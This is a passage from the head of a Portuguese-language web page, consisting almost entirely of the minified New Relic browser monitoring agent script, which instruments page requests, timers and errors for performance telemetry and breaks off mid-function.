<!doctype html>
<html class="no-js" lang="pt-br">
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <script type="text/javascript">(window.NREUM||(NREUM={})).init={privacy:{cookies_enabled:true},ajax:{deny_list:["bam.nr-data.net"]},distributed_tracing:{enabled:true}};(window.NREUM||(NREUM={})).loader_config={agentID:"1134170823",accountID:"2935249",trustKey:"2935249",xpid:"Vg8EVFRXARAJVldbDwQGVVU=",licenseKey:"NRJS-1173a7bb9742e987ab2",applicationID:"926985131"};;(()=>{var e,t,r={9071:(e,t,r)=>{"use strict";r.d(t,{I:()=>n});var n=0,i=navigator.userAgent.match(/Firefox[\/\s](\d+\.\d+)/);i&&(n=+i[1])},8768:(e,t,r)=>{"use strict";r.d(t,{T:()=>n,p:()=>i});const n=/(iPad|iPhone|iPod)/g.test(navigator.userAgent),i=n&&Boolean("undefined"==typeof SharedWorker)},2919:(e,t,r)=>{"use strict";r.d(t,{P_:()=>g,Mt:()=>v,C5:()=>c,DL:()=>y,OP:()=>R,lF:()=>P,Yu:()=>E,Dg:()=>p,CX:()=>u,GE:()=>w,sU:()=>C});var n={};r.r(n),r.d(n,{agent:()=>A,match:()=>N,version:()=>x});var i=r(6797),o=r(4286);const a={beacon:i.ce.beacon,errorBeacon:i.ce.errorBeacon,licenseKey:void 0,applicationID:void 0,sa:void 0,queueTime:void 0,applicationTime:void 0,ttGuid:void 0,user:void 0,account:void 0,product:void 0,extra:void 0,jsAttributes:{},userAttributes:void 0,atts:void 0,transactionName:void 0,tNamePlain:void 0},s={};function c(e){if(!e)throw new Error("All info objects require an agent identifier!");if(!s[e])throw new Error("Info for ".concat(e," was never set"));return s[e]}function u(e,t){if(!e)throw new Error("All info objects require an agent identifier!");s[e]=new o.I(t,a),(0,i.Qy)(e,s[e],"info")}var d=r(2797),f=r(2374);const l={allow_bfcache:!0,privacy:{cookies_enabled:!0},ajax:{deny_list:void 0,enabled:!0,harvestTimeSeconds:10},distributed_tracing:{enabled:void 0,exclude_newrelic_header:void 0,cors_use_newrelic_header:void 0,cors_use_tracecontext_headers:void 0,allowed_origins:void 0},session:{domain:void 0,expiresMs:d.oD,inactiveMs:d.Hb},ssl:void 0,obfuscate:void 0,jserrors:{enabled:!0,harvestTimeSeconds:10},metrics:{enabled:!0},page_action:{enabled:!0,harvestTimeSeconds:30},page_view_event:{enabled:!0},page_view_timing:{enabled:!0,harvestTimeSeconds:30,long_task:!1},session_trace:{enabled:!0,harvestTimeSeconds:10},spa:{enabled:!0,harvestTimeSeconds:10}},h={};function g(e){if(!e)throw new Error("All configuration objects require an agent identifier!");if(!h[e])throw new Error("Configuration for ".concat(e," was never set"));return h[e]}function p(e,t){if(!e)throw new Error("All configuration objects require an agent identifier!");h[e]=new o.I(t,l),(0,i.Qy)(e,h[e],"config")}function v(e,t){if(!e)throw new Error("All configuration objects require an agent identifier!");var r=g(e);if(r){for(var n=t.split("."),i=0;i<n.length-1;i++)if("object"!=typeof(r=r[n[i]]))return;r=r[n[n.length-1]]}return r}const m={accountID:void 0,trustKey:void 0,agentID:void 0,licenseKey:void 0,applicationID:void 0,xpid:void 0},b={};function y(e){if(!e)throw new Error("All loader-config objects require an agent identifier!");if(!b[e])throw new Error("LoaderConfig for ".concat(e," was never set"));return b[e]}function w(e,t){if(!e)throw new Error("All loader-config objects require an agent identifier!");b[e]=new o.I(t,m),(0,i.Qy)(e,b[e],"loader_config")}const E=(0,i.mF)().o;var A=null,x=null;const T=/Version\/(\S+)\s+Safari/;if(navigator.userAgent){var _=navigator.userAgent,D=_.match(T);D&&-1===_.indexOf("Chrome")&&-1===_.indexOf("Chromium")&&(A="Safari",x=D[1])}function N(e,t){if(!A)return!1;if(e!==A)return!1;if(!t)return!0;if(!x)return!1;for(var r=x.split("."),n=t.split("."),i=0;i<n.length;i++)if(n[i]!==r[i])return!1;return!0}var S=r(1651);const O={buildEnv:S.Re,bytesSent:{},queryBytesSent:{},customTransaction:void 0,disabled:!1,distMethod:S.gF,isolatedBacklog:!1,loaderType:void 0,maxBytes:3e4,offset:Math.floor(f._A?.performance?.timeOrigin||f._A?.performance?.timing?.navigationStart||Date.now()),onerror:void 0,origin:""+f._A.location,ptid:void 0,releaseIds:{},session:void 0,xhrWrappable:"function"==typeof f._A.XMLHttpRequest?.prototype?.addEventListener,userAgent:n,version:S.q4},j={};function R(e){if(!e)throw new Error("All runtime objects require an agent identifier!");if(!j[e])throw new Error("Runtime for ".concat(e," was never set"));return j[e]}function C(e,t){if(!e)throw new Error("All runtime objects require an agent identifier!");j[e]=new o.I(t,O),(0,i.Qy)(e,j[e],"runtime")}function P(e){return function(e){try{const t=c(e);return!!t.licenseKey&&!!t.errorBeacon&&!!t.applicationID}catch(e){return!1}}(e)}},4286:(e,t,r)=>{"use strict";r.d(t,{I:()=>o});var n=r(909),i=r(8610);class o{constructor(e,t){Object.assign(this,function(e,t){const r={};try{return e&&"object"==typeof e?t&&"object"==typeof t?(Object.assign(r,t),Object.entries(e).forEach((e=>{let[o,a]=e;if(!Object.keys(t).includes(o))return;const s=(0,n.q)(o);s.length&&a&&"object"==typeof a&&s.forEach((e=>{e in a&&((0,i.Z)('"'.concat(e,'" is a protected attribute and can not be changed in feature ').concat(o,".  It will have no effect.")),delete a[e])})),r[o]=a})),r):(0,i.Z)("Setting a Configurable requires a model to set its initial properties"):(0,i.Z)("New setting a Configurable requires an object as input")}catch(e){(0,i.Z)("An error occured while setting a Configurable",e)}}(e,t))}}},1651:(e,t,r)=>{"use strict";r.d(t,{Re:()=>i,gF:()=>o,q4:()=>n});const n="1.232.0",i="PROD",o="CDN"},9557:(e,t,r)=>{"use strict";r.d(t,{w:()=>o});var n=r(8610);const i={agentIdentifier:"",ee:void 0};class o{constructor(e){try{if("object"!=typeof e)return(0,n.Z)("shared context requires an object as input");this.sharedContext={},Object.assign(this.sharedContext,i),Object.entries(e).forEach((e=>{let[t,r]=e;Object.keys(i).includes(t)&&(this.sharedContext[t]=r)}))}catch(e){(0,n.Z)("An error occured while setting SharedContext",e)}}}},4329:(e,t,r)=>{"use strict";r.d(t,{L:()=>d,R:()=>c});var n=r(3752),i=r(7022),o=r(4045),a=r(2325);const s={};function c(e,t){const r={staged:!1,priority:a.p[t]||0};u(e),s[e].get(t)||s[e].set(t,r)}function u(e){e&&(s[e]||(s[e]=new Map))}function d(){let e=arguments.length>0&&void 0!==arguments[0]?arguments[0]:"",t=arguments.length>1&&void 0!==arguments[1]?arguments[1]:"feature";if(u(e),!e||!s[e].get(t))return a(t);s[e].get(t).staged=!0;const r=Array.from(s[e]);function a(t){const r=e?n.ee.get(e):n.ee,a=o.X.handlers;if(r.backlog&&a){var s=r.backlog[t],c=a[t];if(c){for(var u=0;s&&u<s.length;++u)f(s[u],c);(0,i.D)(c,(function(e,t){(0,i.D)(t,(function(t,r){r[0].on(e,r[1])}))}))}delete a[t],r.backlog[t]=null,r.emit("drain-"+t,[])}}r.every((e=>{let[t,r]=e;return r.staged}))&&(r.sort(((e,t)=>e[1].priority-t[1].priority)),r.forEach((e=>{let[t]=e;a(t)})))}function f(e,t){var r=e[1];(0,i.D)(t[r],(function(t,r){var n=e[0];if(r[0]===n){var i=r[1],o=e[3],a=e[2];i.apply(o,a)}}))}},3752:(e,t,r)=>{"use strict";r.d(t,{c:()=>f,ee:()=>u});var n=r(6797),i=r(3916),o=r(7022),a=r(2919),s="nr@context";let c=(0,n.fP)();var u;function d(){}function f(e){return(0,i.X)(e,s,l)}function l(){return new d}function h(){u.aborted=!0,u.backlog={}}c.ee?u=c.ee:(u=function e(t,r){var n={},c={},f={},g=!1;try{g=16===r.length&&(0,a.OP)(r).isolatedBacklog}catch(e){}var p={on:b,addEventListener:b,removeEventListener:y,emit:m,get:E,listeners:w,context:v,buffer:A,abort:h,aborted:!1,isBuffering:x,debugId:r,backlog:g?{}:t&&"object"==typeof t.backlog?t.backlog:{}};return p;function v(e){return e&&e instanceof d?e:e?(0,i.X)(e,s,l):l()}function m(e,r,n,i,o){if(!1!==o&&(o=!0),!u.aborted||i){t&&o&&t.emit(e,r,n);for(var a=v(n),s=w(e),d=s.length,f=0;f<d;f++)s[f].apply(a,r);var l=T()[c[e]];return l&&l.push([p,e,r,a]),a}}function b(e,t){n[e]=w(e).concat(t)}function y(e,t){var r=n[e];if(r)for(var i=0;i<r.length;i++)r[i]===t&&r.splice(i,1)}function w(e){return n[e]||[]}function E(t){return f[t]=f[t]||e(p,t)}function A(e,t){var r=T();p.aborted||(0,o.D)(e,(function(e,n){t=t||"feature",c[n]=t,t in r||(r[t]=[])}))}function x(e){return!!T()[c[e]]}function T(){return p.backlog}}(void 0,"globalEE"),c.ee=u)},9252:(e,t,r)=>{"use strict";r.d(t,{E:()=>n,p:()=>i});var n=r(3752).ee.get("handle");function i(e,t,r,i,o){o?(o.buffer([e],i),o.emit(e,t,r)):(n.buffer([e],i),n.emit(e,t,r))}},4045:(e,t,r)=>{"use strict";r.d(t,{X:()=>o});var n=r(9252);o.on=a;var i=o.handlers={};function o(e,t,r,o){a(o||n.E,i,e,t,r)}function a(e,t,r,i,o){o||(o="feature"),e||(e=n.E);var a=t[o]=t[o]||{};(a[r]=a[r]||[]).push([e,i])}},8544:(e,t,r)=>{"use strict";r.d(t,{bP:()=>s,iz:()=>c,m$:()=>a});var n=r(2374);let i=!1,o=!1;try{const e={get passive(){return i=!0,!1},get signal(){return o=!0,!1}};n._A.addEventListener("test",null,e),n._A.removeEventListener("test",null,e)}catch(e){}function a(e,t){return i||o?{capture:!!e,passive:i,signal:t}:!!e}function s(e,t){let r=arguments.length>2&&void 0!==arguments[2]&&arguments[2],n=arguments.length>3?arguments[3]:void 0;window.addEventListener(e,t,a(r,n))}function c(e,t){let r=arguments.length>2&&void 0!==arguments[2]&&arguments[2],n=arguments.length>3?arguments[3]:void 0;document.addEventListener(e,t,a(r,n))}},5526:(e,t,r)=>{"use strict";r.d(t,{Ht:()=>u,M:()=>c,Rl:()=>a,ky:()=>s});var n=r(2374);const i="xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx";function o(e,t){return e?15&e[t]:16*Math.random()|0}function a(){const e=n._A?.crypto||n._A?.msCrypto;let t,r=0;return e&&e.getRandomValues&&(t=e.getRandomValues(new Uint8Array(31))),i.split("").map((e=>"x"===e?o(t,++r).toString(16):"y"===e?(3&o()|8).toString(16):e)).join("")}function s(e){const t=n._A?.crypto||n._A?.msCrypto;let r,i=0;t&&t.getRandomValues&&(r=t.getRandomValues(new Uint8Array(31)));const a=[];for(var s=0;s<e;s++)a.push(o(r,++i).toString(16));return a.join("")}function c(){return s(16)}function u(){return s(32)}},2797:(e,t,r)=>{"use strict";r.d(t,{Bq:()=>n,Hb:()=>o,oD:()=>i});const n="NRBA",i=144e5,o=18e5},2053:(e,t,r)=>{"use strict";function n(){return Math.round(performance.now())}r.d(t,{z:()=>n})},6368:(e,t,r)=>{"use strict";r.d(t,{e:()=>o});var n=r(2374),i={};function o(e){if(e in i)return i[e];if(0===(e||"").indexOf("data:"))return{protocol:"data"};let t;var r=n._A?.location,o={};if(n.il)t=document.createElement("a"),t.href=e;else try{t=new URL(e,r.href)}catch(e){return o}o.port=t.port;var a=t.href.split("://");!o.port&&a[1]&&(o.port=a[1].split("/")[0].split("@").pop().split(":")[1]),o.port&&"0"!==o.port||(o.port="https"===a[0]?"443":"80"),o.hostname=t.hostname||r.hostname,o.pathname=t.pathname,o.protocol=a[0],"/"!==o.pathname.charAt(0)&&(o.pathname="/"+o.pathname);var s=!t.protocol||":"===t.protocol||t.protocol===r.protocol,c=t.hostname===r.hostname&&t.port===r.port;return o.sameOrigin=s&&(!t.hostname||c),"/"===o.pathname&&(i[e]=o),o}},8610:(e,t,r)=>{"use strict";function n(e,t){"function"==typeof console.warn&&(console.warn("New Relic: ".concat(e)),t&&console.warn(t))}r.d(t,{Z:()=>n})},3916:(e,t,r)=>{"use strict";r.d(t,{X:()=>i});var n=Object.prototype.hasOwnProperty;function i(e,t,r){if(n.call(e,t))return e[t];var i=r();if(Object.defineProperty&&Object.keys)try{return Object.defineProperty(e,t,{value:i,writable:!0,enumerable:!1}),i}catch(e){}return e[t]=i,i}},2374:(e,t,r)=>{"use strict";r.d(t,{_A:()=>o,il:()=>n,v6:()=>i});const n=Boolean("undefined"!=typeof window&&window.document),i=Boolean("undefined"!=typeof WorkerGlobalScope&&self.navigator instanceof WorkerNavigator);let o=(()=>{if(n)return window;if(i){if("undefined"!=typeof globalThis&&globalThis instanceof WorkerGlobalScope)return globalThis;if(self instanceof WorkerGlobalScope)return self}throw new Error('New Relic browser agent shutting down due to error: Unable to locate global scope. This is possibly due to code redefining browser global variables like "self" and "window".')})()},7022:(e,t,r)=>{"use strict";r.d(t,{D:()=>n});const n=(e,t)=>Object.entries(e||{}).map((e=>{let[r,n]=e;return t(r,n)}))},2438:(e,t,r)=>{"use strict";r.d(t,{P:()=>o});var n=r(3752);const i=()=>{const e=new WeakSet;return(t,r)=>{if("object"==typeof r&&null!==r){if(e.has(r))return;e.add(r)}return r}};function o(e){try{return JSON.stringify(e,i())}catch(e){try{n.ee.emit("internal-error",[e])}catch(e){}}}},2650:(e,t,r)=>{"use strict";r.d(t,{K:()=>a,b:()=>o});var n=r(8544);function i(){return"undefined"==typeof document||"complete"===document.readyState}function o(e,t){if(i())return e();(0,n.bP)("load",e,t)}function a(e){if(i())return e();(0,n.iz)("DOMContentLoaded",e)}},6797:(e,t,r)=>{"use strict";r.d(t,{EZ:()=>u,Qy:()=>c,ce:()=>o,fP:()=>a,gG:()=>d,mF:()=>s});var n=r(2053),i=r(2374);const o={beacon:"bam.nr-data.net",errorBeacon:"bam.nr-data.net"};function a(){return i._A.NREUM||(i._A.NREUM={}),void 0===i._A.newrelic&&(i._A.newrelic=i._A.NREUM),i._A.NREUM}function s(){let e=a();return e.o||(e.o={ST:i._A.setTimeout,SI:i._A.setImmediate,CT:i._A.clearTimeout,XHR:i._A.XMLHttpRequest,REQ:i._A.Request,EV:i._A.Event,PR:i._A.Promise,MO:i._A.MutationObserver,FETCH:i._A.fetch}),e}function c(e,t,r){let i=a();const o=i.initializedAgents||{},s=o[e]||{};return Object.keys(s).length||(s.initializedAt={ms:(0,n.z)(),date:new Date}),i.initializedAgents={...o,[e]:{...s,[r]:t}},i}function u(e,t){a()[e]=t}function d(){return function(){let e=a();const t=e.info||{};e.info={beacon:o.beacon,errorBeacon:o.errorBeacon,...t}}(),function(){let e=a();const t=e.init||{};e.init={...t}}(),s(),function(){let e=a();const t=e.loader_config||{};e.loader_config={...t}}(),a()}},6998:(e,t,r)=>{"use strict";r.d(t,{N:()=>i});var n=r(8544);function i(e){let t=arguments.length>1&&void 0!==arguments[1]&&arguments[1],r=arguments.length>2?arguments[2]:void 0,i=arguments.length>3?arguments[3]:void 0;return void(0,n.iz)("visibilitychange",(function(){if(t)return void("hidden"==document.visibilityState&&e());e(document.visibilityState)}),r,i)}},6408:(e,t,r)=>{"use strict";r.d(t,{W:()=>i});var n=r(2374);function i(){return"function"==typeof n._A?.PerformanceObserver}},7264:(e,t,r)=>{"use strict";r.d(t,{em:()=>y,u5:()=>O,QU:()=>C,_L:()=>H,Gm:()=>B,Lg:()=>F,gy:()=>G,BV:()=>K,Kf:()=>re});var n=r(3752),i=r(8683),o=r.n(i);const a="nr@original";var s=Object.prototype.hasOwnProperty,c=!1;function u(e,t){return e||(e=n.ee),r.inPlace=function(e,t,n,i,o){n||(n="");var a,s,c,u="-"===n.charAt(0);for(c=0;c<t.length;c++)l(a=e[s=t[c]])||(e[s]=r(a,u?s+n:n,i,s,o))},r.flag=a,r;function r(t,r,n,s,c){return l(t)?t:(r||(r=""),nrWrapper[a]=t,f(t,nrWrapper,e),nrWrapper);function nrWrapper(){var a,u,f,l;try{u=this,a=o()(arguments),f="function"==typeof n?n(a,u):n||{}}catch(t){d([t,"",[a,u,s],f],e)}i(r+"start",[a,u,s],f,c);try{return l=t.apply(u,a)}catch(e){throw i(r+"err",[a,u,e],f,c),e}finally{i(r+"end",[a,u,l],f,c)}}}function i(r,n,i,o){if(!c||t){var a=c;c=!0;try{e.emit(r,n,i,t,o)}catch(t){d([t,r,n,i],e)}c=a}}}function d(e,t){t||(t=n.ee);try{t.emit("internal-error",e)}catch(e){}}function f(e,t,r){if(Object.defineProperty&&Object.keys)try{return Object.keys(e).forEach((function(r){Object.defineProperty(t,r,{get:function(){return e[r]},set:function(t){return e[r]=t,t}})})),t}catch(e){d([e],r)}for(var n in e)s.call(e,n)&&(t[n]=e[n]);return t}function l(e){return!(e&&e instanceof Function&&e.apply&&!e[a])}var h=r(3916),g=r(2374);const p={},v=XMLHttpRequest,m="addEventListener",b="removeEventListener";function y(e){var t=function(e){return(e||n.ee).get("events")}(e);if(p[t.debugId]++)return t;p[t.debugId]=1;var r=u(t,!0);function i(e){r.inPlace(e,[m,b],"-",o)}function o(e,t){return e[1]}return"getPrototypeOf"in Object&&(g.il&&w(document,i),w(g._A,i),w(v.prototype,i)),t.on(m+"-start",(function(e,t){var n=e[1];if(null!==n&&("function"==typeof n||"object"==typeof n)){var i=(0,h.X)(n,"nr@wrapped",(function(){var e={object:function(){if("function"!=typeof n.handleEvent)return;return n.handleEvent.apply(n,arguments)},function:n}[typeof n];return e?r(e,"fn-",null,e.name||"anonymous"):n}));this.wrapped=e[1]=i}})),t.on(b+"-start",(function(e){e[1]=this.wrapped||e[1]})),t}function w(e,t){let r=e;for(;"object"==typeof r&&!Object.prototype.hasOwnProperty.call(r,m);)r=Object.getPrototypeOf(r);for(var n=arguments.length,i=new Array(n>2?n-2:0),o=2;o<n;o++)i[o-2]=arguments[o];r&&t(r,...i)}var E="fetch-",A=E+"body-",x=["arrayBuffer","blob","json","text","formData"],T=g._A.Request,_=g._A.Response,D="prototype",N="nr@context";const S={};function O(e){const t=function(e){return(e||n.ee).get("fetch")}(e);if(!(T&&_&&g._A.fetch))return t;if(S[t.debugId]++)return t;function r(e,r,n){var i=e[r];"function"==typeof i&&(e[r]=function(){var e,r=o()(arguments),a={};t.emit(n+"before-start",[r],a),a[N]&&a[N].dt&&(e=a[N].dt);var s=i.apply(this,r);return t.emit(n+"start",[r,e],s),s.then((function(e){return t.emit(n+"end",[null,e],s),e}),(function(e){throw t.emit(n+"end",[e],s),e}))})}return S[t.debugId]=1,x.forEach((e=>{r(T[D],e,A),r(_[D],e,A)})),r(g._A,"fetch",E),t.on(E+"end",(function(e,r){var n=this;if(r){var i=r.headers.get("content-length");null!==i&&(n.rxSize=i),t.emit(E+"done",[null,r],n)}else t.emit(E+"done",[e],n)})),t}const j={},R=["pushState","replaceState"];function C(e){const t=function(e){return(e||n.ee).get("history")}(e);return!g.il||j[t.debugId]++||(j[t.debugId]=1,u(t).inPlace(window.history,R,"-")),t}var P=r(8544);const I={},k=["appendChild","insertBefore","replaceChild"];function H(e){const t=function(e){return(e||n.ee).get("jsonp")}(e);if(!g.il||I[t.debugId])return t;I[t.debugId]=!0;var r=u(t),i=/[?&](?:callback|cb)=([^&#]+)/,o=/(.*)\.([^.]+)/,a=/^(\w+)(\.|$)(.*)$/;function s(e,t){var r=e.match(a),n=r[1],i=r[3];return i?s(i,t[n]):t[n]}return r.inPlace(Node.prototype,k,"dom-"),t.on("dom-start",(function(e){!function(e){if(!e||"string"!=typeof e.nodeName||"script"!==e.nodeName.toLowerCase())return;if("function"!=typeof e.addEventListener)return;var n=(a=e.src,c=a.match(i),c?c[1]:null);var a,c;if(!n)return;var u=function(e){var t=e.match(o);if(t&&t.length>=3)return{key:t[2],parent:s(t[1],window)};return{key:e,parent:window}}(n);if("function"!=typeof u.parent[u.key])return;var d={};function f(){t.emit("jsonp-end",[],d),e.removeEventListener("load",f,(0,P.m$)(!1)),e.removeEventListener("error",l,(0,P.m$)(!1))}function l(){t.emit("jsonp-error",[],d),t.emit("jsonp-end",[],d),e.removeEventListener("load",f,(0,P.m$)(!1)),e.removeEventListener("error",l,(0,P.m$)(!1))}r.inPlace(u.parent,[u.key],"cb-",d),e.addEventListener("load",f,(0,P.m$)(!1)),e.addEventListener("error",l,(0,P.m$)(!1)),t.emit("new-jsonp",[e.src],d)}(e[0])})),t}var L=r(2919);const z={};function B(e){const t=function(e){return(e||n.ee).get("mutation")}(e);if(!g.il||z[t.debugId])return t;z[t.debugId]=!0;var r=u(t),i=L.Yu.MO;return i&&(window.MutationObserver=function(e){return this instanceof i?new i(r(e,"fn-")):i.apply(this,arguments)},MutationObserver.prototype=i.prototype),t}const M={};function F(e){const t=function(e){return(e||n.ee).get("promise")}(e);if(M[t.debugId])return t;M[t.debugId]=!0;var r=n.c,i=u(t),o=L.Yu.PR;return o&&function(){function e(r){var n=t.context(),a=i(r,"executor-",n,null,!1);const s=Reflect.construct(o,[a],e);return t.context(s).getCtx=function(){return n},s}g._A.Promise=e,Object.defineProperty(e,"name",{value:"Promise"}),e.toString=function(){return o.toString()},Object.setPrototypeOf(e,o),["all","race"].forEach((function(r){const n=o[r];e[r]=function(e){let i=!1;Array.from(e||[]).forEach((e=>{this.resolve(e).then(a("all"===r),a(!1))}));const o=n.apply(this,arguments);return o;function a(e){return function(){t.emit("propagate",[null,!i],o,!1,!1),i=i||!e}}}})),["resolve","reject"].forEach((function(r){const n=o[r];e[r]=function(e){const r=n.apply(this,arguments);return e!==r&&t.emit("propagate",[e,!0],r,!1,!1),r}})),e.prototype=o.prototype;const n=o.prototype.then;o.prototype.then=function(){var e=this,o=r(e);o.promise=e;for(var a=arguments.length,s=new Array(a),c=0;c<a;c++)s[c]=arguments[c];s[0]=i(s[0],"cb-",o,null,!1),s[1]=i(s[1],"cb-",o,null,!1);const u=n.apply(this,s);return o.nextPromise=u,t.emit("propagate",[e,!0],u,!1,!1),u},o.prototype.then[a]=n,t.on("executor-start",(function(e){e[0]=i(e[0],"resolve-",this,null,!1),e[1]=i(e[1],"resolve-",this,null,!1)})),t.on("executor-err",(function(e,t,r){e[1](r)})),t.on("cb-end",(function(e,r,n){t.emit("propagate",[n,!0],this.nextPromise,!1,!1)})),t.on("propagate",(function(e,r,n){this.getCtx&&!r||(this.getCtx=function(){if(e instanceof Promise)var r=t.context(e);return r&&r.getCtx?r.getCtx():this})}))}(),t}const U={},q="requestAnimationFrame";function G(e){const t=function(e){return(e||n.ee).get("raf")}(e);if(!g.il||U[t.debugId]++)return t;U[t.debugId]=1;var r=u(t);return r.inPlace(window,[q],"raf-"),t.on("raf-start",(function(e){e[0]=r(e[0],"fn-")})),t}const V={},W="setTimeout",X="setInterval",Z="clearTimeout",$="-start",Y="-",Q=[W,"setImmediate",X,Z,"clearImmediate"];function K(e){const t=function(e){return(e||n.ee).get("timer")}(e);if(V[t.debugId]++)return t;V[t.debugId]=1;var r=u(t);return r.inPlace(g._A,Q.slice(0,2),W+Y),r.inPlace(g._A,Q.slice(2,3),X+Y),r.inPlace(g._A,Q.slice(3),Z+Y),t.on(X+$,(function(e,t,n){e[0]=r(e[0],"fn-",null,n)})),t.on(W+$,(function(e,t,n){this.method=n,this.timerDuration=isNaN(e[1])?0:+e[1],e[0]=r(e[0],"fn-",this,n)})),t}var J=r(8610);const ee={},te=["open","send"];function re(e){var t=e||n.ee;const r=function(e){return(e||n.ee).get("xhr")}(t);if(ee[r.debugId]++)return r;ee[r.debugId]=1,y(t);var i=u(r),o=L.Yu.XHR,a=L.Yu.MO,s=L.Yu.PR,c=L.Yu.SI,d="readystatechange",f=["onload","onerror","onabort","onloadstart","onloadend","onprogress","ontimeout"],l=[],h=g._A.XMLHttpRequest.listeners,p=g._A.XMLHttpRequest=function(e){var t=new o(e);function n(){try{r.emit("new-xhr",[t],t),t.addEventListener(d,m,(0,P.m$)(!1))}catch(e){(0,J.Z)("An error occured while intercepting XHR",e);try{r.emit("internal-error",[e])}catch(e){}}}return this.listeners=h?[...h,n]:[n],this.listeners.forEach((e=>e())),t};function v(e,t){i.inPlace(t,["onreadystatechange"],"fn-",x)}function m(){var e=this,t=r.context(e);e.readyState>3&&!t.resolved&&(t.resolved=!0,r.emit("xhr-resolved",[],e)),i.inPlace(e,f,"fn-",x)}if(function(e,t){for(var r in e)t[r]=e[r]}(o,p),p.prototype=o.prototype,i.inPlace(p.prototype,te,"-xhr-",x),r.on("send-xhr-start",(function(e,t){v(e,t),function(e){l.push(e),a&&(b?b.then(A):c?c(A):(w=-w,E.data=w))}(t)})),r.on("open-xhr-start",v),a){var b=s&&s.resolve();if(!c&&!s){var w=1,E=document.createTextNode(w);new a(A).observe(E,{characterData:!0})}}else t.on("fn-end",(function(e){e[0]&&e[0].type===d||A()}));function A(){for(var e=0;e<l.length;e++)v(0,l[e]);l.length&&(l=[])}function x(e,t){return t}return r}},8675:(e,t,r)=>{"use strict";r.d(t,{t:()=>n});const n=r(2325).D.ajax},8322:(e,t,r)=>{"use strict";r.d(t,{A:()=>i,t:()=>n});const n=r(2325).D.jserrors,i="nr@seenError"},6034:(e,t,r)=>{"use strict";r.d(t,{gF:()=>o,mY:()=>i,t9:()=>n,vz:()=>s,xS:()=>a});const n=r(2325).D.metrics,i="sm",o="cm",a="storeSupportabilityMetrics",s="storeEventMetrics"},6486:(e,t,r)=>{"use strict";r.d(t,{t:()=>n});const n=r(2325).D.pageAction},2484:(e,t,r)=>{"use strict";r.d(t,{Dz:()=>i,OJ:()=>a,qw:()=>o,t9:()=>n});const n=r(2325).D.pageViewEvent,i="firstbyte",o="domcontent",a="windowload"},6382:(e,t,r)=>{"use strict";r.d(t,{t:()=>n});const n=r(2325).D.pageViewTiming},2628:(e,t,r)=>{"use strict";r.d(t,{ADD_EVENT_LISTENER:()=>p,BST_RESOURCE:()=>a,BST_TIMER:()=>l,END:()=>u,FEATURE_NAME:()=>i,FN_END:()=>f,FN_START:()=>d,ORIG_EVENT:()=>g,PUSH_STATE:()=>h,RESOURCE:()=>s,RESOURCE_TIMING_BUFFER_FULL:()=>o,START:()=>c});var n=r(2919);const i=r(2325).D.sessionTrace,o="resourcetimingbufferfull",a="bstResource",s="resource",c="-start",u="-end",d="fn"+c,f="fn"+u,l="bstTimer",h="pushState",g=n.Yu.EV,p="addEventListener"},755:(e,t,r)=>{"use strict";r.d(t,{BODY:()=>A,CB_END:()=>x,CB_START:()=>u,END:()=>E,FEATURE_NAME:()=>i,FETCH:()=>_,FETCH_BODY:()=>m,FETCH_DONE:()=>v,FETCH_START:()=>p,FN_END:()=>c,FN_START:()=>s,INTERACTION:()=>l,INTERACTION_API:()=>d,INTERACTION_EVENTS:()=>o,JSONP_END:()=>b,JSONP_NODE:()=>g,JS_TIME:()=>T,MAX_TIMER_BUDGET:()=>a,REMAINING:()=>f,SPA_NODE:()=>h,START:()=>w,originalSetTimeout:()=>y});var n=r(2919);r(2374);const i=r(2325).D.spa,o=["click","submit","keypress","keydown","keyup","change"],a=999,s="fn-start",c="fn-end",u="cb-start",d="api-ixn-",f="remaining",l="interaction",h="spaNode",g="jsonpNode",p="fetch-start",v="fetch-done",m="fetch-body-",b="jsonp-end",y=n.Yu.ST,w="-start",E="-end",A="-body",x="cb"+E,T="jsTime",_="fetch"},1509:(e,t,r)=>{"use strict";r.d(t,{W:()=>s});var n=r(2919),i=r(3752),o=r(2384),a=r(6797);class s{constructor(e,t,r){this.agentIdentifier=e,this.aggregator=t,this.ee=i.ee.get(e,(0,n.OP)(this.agentIdentifier).isolatedBacklog),this.featureName=r,this.blocked=!1,this.checkConfiguration()}checkConfiguration(){if(!(0,n.lF)(this.agentIdentifier)){let e={...(0,a.gG)().info?.jsAttributes};try{e={...e,...(0,n.C5)(this.agentIdentifier)?.jsAttributes}}catch(e){}(0,o.j)(this.agentIdentifier,{...(0,a.gG)(),info:{...(0,a.gG)().info,jsAttributes:e}})}}}},2384:(e,t,r)=>{"use strict";r.d(t,{j:()=>b});var n=r(2325),i=r(2919),o=r(9252),a=r(3752),s=r(2053),c=r(4329),u=r(2650),d=r(2374),f=r(8610),l=r(6034),h=r(6797);function g(){const e=(0,h.gG)();["setErrorHandler","finished","addToTrace","inlineHit","addRelease","addPageAction","setCurrentRouteName","setPageViewName","setCustomAttribute","interaction","noticeError","setUserId"].forEach((t=>{e[t]=function(){for(var r=arguments.length,n=new Array(r),i=0;i<r;i++)n[i]=arguments[i];return function(t){for(var r=arguments.length,n=new Array(r>1?r-1:0),i=1;i<r;i++)n[i-1]=arguments[i];let o=[];return Object.values(e.initializedAgents).forEach((e=>{e.exposed&&e.api[t]&&o.push(e.api[t](...n))})),o.length>1?o:o[0]}(t,...n)}}))}var p=r(7022);const v={stn:[n.D.sessionTrace],err:[n.D.jserrors,n.D.metrics],ins:[n.D.pageAction],spa:[n.D.spa]};const m={};function b(e){let t=arguments.length>1&&void 0!==arguments[1]?arguments[1]:{},b=arguments.length>2?arguments[2]:void 0,y=arguments.length>3?arguments[3]:void 0,{init:w,info:E,loader_config:A,runtime:x={loaderType:b},exposed:T=!0}=t;const _=(0,h.gG)();E||(w=_.init,E=_.info,A=_.loader_config),E.jsAttributes??={},d.v6&&(E.jsAttributes.isWorker=!0),(0,i.CX)(e,E),(0,i.Dg)(e,w||{}),(0,i.GE)(e,A||{}),(0,i.sU)(e,x),g();const D=function(e,t){t||(0,c.R)(e,"api");const h={};var g=a.ee.get(e),p=g.get("tracer"),v="api-",m=v+"ixn-";function b(t,r,n,o){const a=(0,i.C5)(e);return null===r?delete a.jsAttributes[t]:(0,i.CX)(e,{...a,jsAttributes:{...a.jsAttributes,[t]:r}}),E(v,n,!0,o||null===r?"session":void 0)(t,r)}function 